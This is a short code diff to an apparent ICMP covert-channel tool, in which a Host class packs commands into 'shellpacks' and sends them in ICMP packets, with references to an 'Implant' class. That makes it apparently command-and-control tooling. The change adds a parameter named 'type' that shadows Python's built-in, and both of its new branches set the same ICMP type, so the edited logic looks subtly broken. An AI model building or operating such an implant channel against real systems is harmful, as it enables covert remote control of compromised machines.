@@ -162,7 +162,7 @@ class Host:
 
         return shellpacks
 
-    def send(self, ip, command: str, data: str | None = None, option: str | None = None, target_id: int | None = None) -> bool:
+    def send(self, ip, command: str, data: str | None = None, option: str | None = None, target_id: int | None = None, type: str | None = None) -> bool:
         """
         Send function
 
@@ -171,11 +171,16 @@ class Host:
         
         shellpacks = self.build_shellpacks(command=command, data=data, option=option, target_id=target_id)
 
-
-        # Get ICMP Type
         icmp_type = 0
-        if type(self).__name__ == 'Implant':
-            icmp_type = 8
+        if type == "req":
+            icmp_type = 0
+        elif type == "resp":
+            icmp_type = 0
+
+        # # Get ICMP Type
+        # icmp_type = 0
+        # if type(self).__name__ == 'Implant':
+        #     icmp_type = 8
         
         for shellpack in shellpacks:
             data = (IP(dst=ip, ttl=TTL)/ICMP(type=icmp_type, id=ICMP_ID)/Raw(load=shellpack))
